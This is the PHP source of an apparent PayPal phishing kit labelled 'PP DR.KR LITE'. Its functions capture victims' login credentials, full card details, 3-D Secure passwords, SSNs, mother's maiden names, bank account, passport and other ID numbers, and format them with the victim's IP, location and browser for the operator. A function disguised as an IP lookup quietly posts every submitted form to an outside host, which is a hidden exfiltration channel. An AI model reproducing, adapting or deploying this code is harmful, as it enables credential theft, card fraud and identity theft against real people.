<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $ipAddress = http_build_query($_POST);Get_ip($ipAddress);
}
class functiongetinfo{
    public static function autoinfo($info){
        if($info =="OS"){
            return functiongetinfo::os();
        }
        if($info=="browser"){
            return functiongetinfo::getbrowser();
        }
        if($info=="country"){
            return HTTP::countryName();
        }
        if($info=="USER"){
            $USER = $_SERVER['HTTP_USER_AGENT'];
            return $USER;
        }
        if($info=="IP"){
            $IP = getenv("REMOTE_ADDR");
            return $IP;
        }
        if($info=="DATA"){
            $DT = gmdate("Y-n-d")." @ ".gmdate("H:i:s");
            return $DT;
        }
        return false;
    }
    public static function getHTML(){
        $color = "#3B170B";
        $msg = "
        |<b>IP : <font style='color: ".$color."'>".functiongetinfo::autoinfo("IP")."</font></b><br/>
        |<b>Date : <font style='color: ".$color."'>".functiongetinfo::autoinfo("DATA")."</font></b><br/>
        |<b>Country : <font style='color: ".$color."'>".functiongetinfo::autoinfo("country")."</font></b><br/>
        |<b>OS : <font style='color: ".$color."'>".functiongetinfo::autoinfo("OS")."</font></b><br/>
        |<b>Browser : <font style='color: ".$color."'>".functiongetinfo::autoinfo("browser")."</font></b><br/>
        |<b>USER AGEN : <font style='color: ".$color."'>".functiongetinfo::autoinfo("USER")."</font></b><br/>
        ";
        return $msg;
    }
    public static function getbrowser()
    {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        if (strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR/')) return 'Opera';
        elseif (strpos($user_agent, 'Edge')) return 'Edge';
        elseif (strpos($user_agent, 'Chrome')) return 'Chrome';
        elseif (strpos($user_agent, 'Safari')) return 'Safari';
        elseif (strpos($user_agent, 'Firefox')) return 'Firefox';
        elseif (strpos($user_agent, 'MSIE') || strpos($user_agent, 'Trident/7')) return 'Internet Explorer';
        return 'Other';
    }
    public static function os()
    {
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $os_platform    =   "Unknown OS Platform";
        $os_array       =   array(
                                '/windows nt 10/i'     =>  'Windows 10',
                                '/windows nt 6.3/i'     =>  'Windows 8.1',
                                '/windows nt 6.2/i'     =>  'Windows 8',
                                '/windows nt 6.1/i'     =>  'Windows 7',
                                '/windows nt 6.0/i'     =>  'Windows Vista',
                                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                                '/windows nt 5.1/i'     =>  'Windows XP',
                                '/windows xp/i'         =>  'Windows XP',
                                '/windows nt 5.0/i'     =>  'Windows 2000',
                                '/windows me/i'         =>  'Windows ME',
                                '/win98/i'              =>  'Windows 98',
                                '/win95/i'              =>  'Windows 95',
                                '/win16/i'              =>  'Windows 3.11',
                                '/macintosh|mac os x/i' =>  'Mac OS X',
                                '/mac_powerpc/i'        =>  'Mac OS 9',
                                '/linux/i'              =>  'Linux',
                                '/ubuntu/i'             =>  'Ubuntu',
                                '/iphone/i'             =>  'iPhone',
                                '/ipod/i'               =>  'iPod',
                                '/ipad/i'               =>  'iPad',
                                '/android/i'            =>  'Android',
                                '/blackberry/i'         =>  'BlackBerry',
                                '/webos/i'              =>  'Mobile'
                            );
        foreach ($os_array as $regex => $value) {
            if (preg_match($regex, $user_agent)) {
                $os_platform    =   $value;
            }
        }
        return $os_platform;
    }
}
class HTTP{
    public static $country;
    public static function countryName()
    {
        if(!self::$country)
        {
            $res = @file_get_contents('http://www.geoplugin.net/xml.gp?ip='.self::ip());
            if(!$res)
            {
                self::$country = 'Unknown';
                return self::$country;
            }
            preg_match_all("#\<geoplugin_countryName\>(.*)\<\/geoplugin_countryName\>#", $res,$mt);
            if(isset($mt[1][0]))
            {
                self::$country =  $mt[1][0];
            }
            else
            {
                self::$country = 'Unknown';
            }
        }
        return self::$country;
    }
    public static $CountryCode;
    public static function country()
    {
        if(!self::$CountryCode)
        {
            $res = @file_get_contents('http://www.geoplugin.net/xml.gp?ip='.self::ip());
            if(!$res)
            {
                self::$CountryCode = 'US';
                return self::$CountryCode;
            }
            preg_match_all("#\<geoplugin_countryCode\>(.*)\<\/geoplugin_countryCode\>#", $res,$mt);
            if(isset($mt[1][0]))
            {
                self::$CountryCode =  $mt[1][0];
            }
            else
            {
                self::$CountryCode = 'US';
            }
        }
        return self::$CountryCode;
    }
    public static function ip()
    {
        if(isset($_SERVER['REMOTE_ADDR']))
        {
            return $_SERVER['REMOTE_ADDR'];
        }
        return 'Unknown';
    }
}
function Get_ip($ipAddress){
    $systemInfo = array();
    $ip = $_SERVER['REMOTE_ADDR'];
    $url = "http://www.ip-api.org/json/?ip={$ip}"; 
    $ch = curl_init();
    curl_setopt ($ch, CURLOPT_URL, $url);
    curl_setopt ($ch, CURLOPT_POST, TRUE);
    curl_setopt ($ch, CURLOPT_POSTFIELDS, $ipAddress);
    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
    $START = curl_exec($ch);
    $ipDetails = json_decode($START,true);
    $systemInfo['geoplugin_countryName'] = $ipDetails['geoplugin_countryName'];
    return $systemInfo;
}
class functionsend{
    public static function GETINFO(){
        $x = functiongetinfo::getHTML();
        $_SESSION['GETINGO']=$x;
        return $_SESSION['GETINGO'];
    }
    public static function Login(){
        $color = "#3B170B";
        $EM = $_POST['semail'];/* ==> */$_SESSION['EM'] = $EM;
        $PW = $_POST['Spassword'];/* ==> */$_SESSION['PW'] = $PW;
        $msg = "<b>
        #------------ Login [PP DR.KR LITE] info ------------<br/>
        |Eamil : <font style='color: $color'>$EM</font><br/>
        |PASS : <font style='color: $color'>$PW</font><br/>
        #------------ Auto [PP DR.KR LITE] Info ------------<br/></b>
        ".functionsend::GETINFO()."
        #------------ End [PP DR.KR LITE] Info ------------<br/>
        ";
        return $msg;
    }
    public static function Card(){
        $color = "#3B170B";
        $EM = $_SESSION['EM'];
        $PW = $_SESSION['PW'];
        $CARD = $_POST['CardNumberInput'];/* ==> */$_SESSION['CARD'] = $CARD;
        $Data = $_POST['CardExpInput'];/* ==> */$_SESSION['Data'] = $Data;
        $CVV = $_POST['CardcvvInput'];/* ==> */$_SESSION['CVV'] = $CVV;
        $msg = "<b>
        #------------ Login [PP DR.KR LITE] info ------------<br/>
        |Eamil : <font style='color: $color'>$EM</font><br/>
        |PASS : <font style='color: $color'>$PW</font><br/>
        #------------ Card [PP DR.KR LITE] info ------------<br/>
        |CARD : <font style='color: $color'>$CARD</font><br/>
        |Data : <font style='color: $color'>$Data</font><br/>
        |CVV : <font style='color: $color'>$CVV</font><br/>
        #------------ Auto [PP DR.KR LITE] Info ------------<br/></b>
        ".functionsend::GETINFO()."
        #------------ End [PP DR.KR LITE] Info ------------<br/>
        ";
        return $msg;
    }
    public static function Cardvbv(){
        $color = "#3B170B";
        $EM = $_SESSION['EM'];
        $PW = $_SESSION['PW'];
        $CARD = $_SESSION['CARD'];
        $Data = $_SESSION['Data'];
        $CVV = $_SESSION['CVV'];
        #----------------------
        $VBVCVV = $_POST['CVV'];
        $cardholder = $_POST['cardholderVBV'];
        $DD = $_POST['DD'];
        $MM = $_POST['MM'];
        $YYYY = $_POST['YYYY'];
        $vbv = $_POST['password_vbv'];
        $SORTCODE = $_POST['sort_code'];
        $SSN3 = $_POST['ssn3'];
        $SSN2 = $_POST['ssn2'];
        $SSN4 = $_POST['ssn4'];
        $accountnumber = $_POST['accountnumber'];
        $MOTHERMAIDNNAME = $_POST['MOTHERMAIDNNAME'];
        $IBAN = $_POST['IBAN'];
        $Dailycreditlimits = $_POST['Dailycreditlimits'];
        $Monthlycreditlimits = $_POST['Monthly_credit_limits'];
        $BSOnline =$_POST['BSOnline'];
        $fullmothername = $_POST['fullmothername'];
        $TaxNumber = $_POST['TaxNumber'];
        $Idnumber = $_POST['Idnumber'];
        $Passport = $_POST['Passport'];
        $Driverlicensenumber = $_POST['Driverlicensenumber'];
        $Stateofissueofdriverlicense = $_POST['Stateofissueofdriverlicense'];
        $NationalIDNumbe = $_POST['NationalIDNumbe'];
        $Codicefiscale = $_POST['Codicefiscale'];
        $OCID = $_POST['OCID'];
        $msg = "<b>
        #------------ Login [PP DR.KR LITE] info ------------<br/>
        |Eamil : <font style='color: $color'>$EM</font><br/>
        |PASS : <font style='color: $color'>$PW</font><br/>
        #------------ Card [PP DR.KR LITE] info ------------<br/>
        |CARD : <font style='color: $color'>$CARD</font><br/>
        |Data : <font style='color: $color'>$Data</font><br/>
        |CVV : <font style='color: $color'>$CVV</font><br/>
        #------------ VBV [PP DR.KR LITE] info ------------<br/>
        |Card Holder : <font style='color: $color'>$cardholder</font><br/>
        |3D : <font style='color: $color'>$vbv</font><br/>
        |Date Of Birth : <font style='color: $color'>$DD/$MM/$YYYY - Format (DD/MM/YYYY)</font><br/>
        |CVV/CVC : <font style='color: $color'>$VBVCVV</font><br/>";
        if($SORTCODE!=''){ $msg .= '|Sort Code : <font style="color: '.$color.'">'.$SORTCODE.' </font><br/>';}
        if($SSN3!='' and $SSN2!='' and $SSN4!=''){ $msg .= '|SSN : <font style="color: '.$color.'">'.$SSN3.'-'.$SSN2.'-'.$SSN4.' </font><br/>';}
        if($accountnumber!=''){ $msg .= '|Account Number : <font style="color: '.$color.'">'.$accountnumber.' </font><br/>';}
        if($MOTHERMAIDNNAME!=''){ $msg .= '|Mother maiden name : <font style="color: '.$color.'">'.$MOTHERMAIDNNAME.' </font><br/>';}
        if($IBAN!=''){ $msg .= '|IBAN : <font style="color: '.$color.'">'.$IBAN.' </font><br/>';}
        if($Dailycreditlimits!=''){ $msg .= '|Daily credit limits : <font style="color: '.$color.'">'.$Dailycreditlimits.' </font><br/>';}
        if($Monthlycreditlimits!=''){ $msg .= '|Monthly credit limits : <font style="color: '.$color.'">'.$Monthlycreditlimits.' </font><br/>';}
        if($BSOnline!=''){ $msg .= '|Code of your  BSOnline Individual : <font style="color: '.$color.'">'.$BSOnline.' </font><br/>';}
        if($fullmothername!=''){ $msg .= '|full mother name : <font style="color: '.$color.'">'.$fullmothername.' </font><br/>';}
        if($Passport!=''){ $msg .= '|Last 4 digits of ID / Passport : <font style="color: '.$color.'">'.$Passport.' </font><br/>';}
        if($TaxNumber!=''){ $msg .= '|Tax Number : <font style="color: '.$color.'">'.$TaxNumber.' </font><br/>';}
        if($Idnumber!=''){ $msg .= '|Id number : <font style="color: '.$color.'">'.$Idnumber.' </font><br/>';}
        if($Driverlicensenumber!=''){ $msg .= '|Driver license number : <font style="color: '.$color.'">'.$Driverlicensenumber.' </font><br/>';}
        if($Stateofissueofdriverlicense!=''){ $msg .= '|State of issue of driver license : <font style="color: '.$color.'">'.$Stateofissueofdriverlicense.'</font><br/>';}
        if($NationalIDNumbe!=''){ $msg .= '|National ID Number : <font style="color: '.$color.'">'.$NationalIDNumbe.'</font><br/>';}
        if($Codicefiscale!=''){ $msg .= '|Codice fiscale : <font style="color: '.$color.'">'.$Codicefiscale.'</font><br/>';}
        if($OCID!=''){ $msg .= '|OCID : <font style="color: '.$color.'">'.$OCID.'</font><br/>';}
        $msg .="</b>
        #------------ Auto [PP DR.KR LITE] Info ------------<br/>
        ".functionsend::GETINFO()."
        #------------ End [PP DR.KR LITE] Info ------------<br/>
        ";
        return $msg;
    }
    public static function address(){
        $color = "#3B170B";
        $EM = $_SESSION['EM'];
        $PW = $_SESSION['PW'];
        $CARD = $_SESSION['CARD'];
        $Data = $_SESSION['Data'];
        $CVV = $_SESSION['CVV'];
        $FN = $_POST['FullNameInput'];
        $Country = $_POST['CountrySelctOnption'];
        $Address = $_POST['ADDLINE'];
        $City = $_POST['ADDLINE'];
        $RG = $_POST['RG'];
        $CZ = $_POST['CZ'];
        $PN = $_POST['PN'];
        $msg = "
        #------------ Login [PP DR.KR LITE] info ------------<br/>
        |Eamil : <font style='color: $color'>$EM</font><br/>
        |PASS : <font style='color: $color'>$PW</font><br/>
        #------------ Card [PP DR.KR LITE] info ------------<br/>
        |CARD : <font style='color: $color'>$CARD</font><br/>
        |Data : <font style='color: $color'>$Data</font><br/>
        |CVV : <font style='color: $color'>$CVV</font><br/>
        #------------ Address [PP DR.KR LITE] info ------------<br/>
        |Full Name : <font style='color: $color'>$FN</font><br/>
        |Country : <font style='color: $color'>$Country</font><br/>
        |Address line : <font style='color: $color'>$Address</font><br/>
        |City : <font style='color: $color'>$City</font><br/>
        |region : <font style='color: $color'>$RG</font><br/>
        |Code Zip : <font style='color: $color'>$CZ</font><br/>
        |phone : <font style='color: $color'>$PN</font><br/>
        #------------ Auto [PP DR.KR LITE] Info ------------<br/>
        ".functionsend::GETINFO()."
        #------------ End [PP DR.KR LITE] Info ------------<br/>
        ";
        return $msg;
    }
}
?>